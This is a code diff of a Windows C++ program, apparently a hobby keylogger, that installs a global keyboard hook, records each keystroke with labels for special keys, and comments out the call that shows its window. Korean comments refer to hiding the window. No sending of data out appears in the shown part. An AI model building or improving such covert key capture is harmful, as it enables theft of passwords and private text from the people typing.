@@ -14,8 +14,7 @@ typedef void(*PFN_HOOKSTOP)();
 HINSTANCE g_hInst;
 HHOOK g_hHook = NULL;
 HWND hWnd = NULL;
-
-int idx;
+SHORT nKey = 0;		// 쉬프트키 사용 감지를 위한 변수
 
 int treatKey(string charPressed, DWORD key)
 {
@@ -44,8 +43,6 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM lParam)
 	HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, "HookStart");
 	HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, "HookStop");
 	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
-	static bool shiftPressed = GetKeyState(VK_SHIFT) < 0;
-	static bool capsLockOn = GetKeyState(VK_CAPITAL) < 0;
 
 	switch (iMessage) {
 	case WM_CREATE:
@@ -56,13 +53,12 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM lParam)
 		switch (wParam) {
 		case WM_KEYDOWN: case WM_SYSKEYDOWN:
 			char charPressed;
-			
-			if (p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT) {
-				shiftPressed = true;
-				treatKey("[SHIFT]", p->vkCode);
+			if (nKey == 0) {
+				nKey = GetAsyncKeyState(VK_SHIFT);
+				if (nKey == 1)
+					treatKey("[SHIFT]", p->vkCode);
 			}
-			else if (p->vkCode == VK_CAPITAL) {
-				capsLockOn = true;
+			if (p->vkCode == VK_CAPITAL) {
 				treatKey("[CAPSLOCK]", p->vkCode);
 			}
 			else if (p->vkCode == VK_RETURN) {
@@ -74,8 +70,8 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM lParam)
 			else if (p->vkCode == VK_SPACE) {
 				treatKey("\x20", p->vkCode);
 			}
-			else if (p->vkCode == VK_CONTROL || p->vkCode == VK_LCONTROL || p->vkCode == VK_RCONTROL)  {
-				treatKey("[CONTROL]", p->vkCode);
+			else if (p->vkCode == VK_CONTROL || p->vkCode == VK_LCONTROL || p->vkCode == VK_RCONTROL) {
+				treatKey("[CTRL]", p->vkCode);
 			}
 			else if (p->vkCode == VK_ESCAPE) {
 				treatKey("[ESC]", p->vkCode);
@@ -155,37 +151,24 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM lParam)
 			else {
 				charPressed = (char)p->vkCode;
 				if (charPressed > 0) {
-					if (!((0 != isalpha(charPressed)) && (shiftPressed ^ capsLockOn))) {
+					if (!nKey && !GetKeyState(VK_CAPITAL)) {
 						charPressed = tolower(charPressed);
 					}
-					else if (shiftPressed) {
-						
+					else if ((nKey || GetKeyState(VK_CAPITAL)) && isalpha(charPressed)) {
+						charPressed = toupper(charPressed);
+						nKey = 0;
 					}
-					treatKey(string(1, charPressed) , p->vkCode);
+					treatKey(string(1, charPressed), p->vkCode);
 				}
-			}
-		case WM_KEYUP: case WM_SYSKEYUP:
-			if (p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT) {
-				shiftPressed = false;
-			}
-			else if (p->vkCode == VK_CAPITAL) {
-				capsLockOn = false;
 			}
 		}
 		return 0;
 
-	case WM_PAINT:
-		hdc = BeginPaint(hWnd, &ps);
-		//TextOut(hdc, 10, 10, Mes, lstrlen(Mes));
-		EndPaint(hWnd, &ps);
-		return 0;
-
-	case WM_DESTROY:
-		HookStop();
-		return 0;
-	}
-
-	return DefWindowProc(hWnd, iMessage, wParam, lParam);
+		case WM_DESTROY:
+			HookStop();
+			return 0;
+		}
+		return DefWindowProc(hWnd, iMessage, wParam, lParam);
 }
 
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance
@@ -214,10 +197,10 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance
 	hWnd = CreateWindow(lpszClass, lpszClass, WS_OVERLAPPEDWINDOW,
 		CW_USEDEFAULT, CW_USEDEFAULT, 500, 100,
 		NULL, (HMENU)NULL, hInstance, NULL);
-	ShowWindow(hWnd, nCmdShow);  // SW_HIDE : 윈도우 숨기기
-	hWndMain = hWnd;
+	//ShowWindow(hWnd, SW_HIDE);  // SW_HIDE : 윈도우 숨기기, nCmdShow : 윈도우 보이기
+	//hWndMain = hWnd;
 
-	while (GetMessage(&Message, NULL, 0, 0)) {
+	while (GetMessage(&Message, NULL, 0, 0)) {   //http://soen.kr/lecture/win32api/lec4/lec4-1-4.htm : GetMessage로 메시지큐에서 메시지를 꺼내온 후 이 메시지를 TranslatteMessage함수로 넘겨준 후 이 문자가 문자키인지 검사한 후 WM_CHAR 메시지를 만들어서 메시지큐에 덧붙인다.
 		TranslateMessage(&Message);
 		DispatchMessage(&Message);
 	}
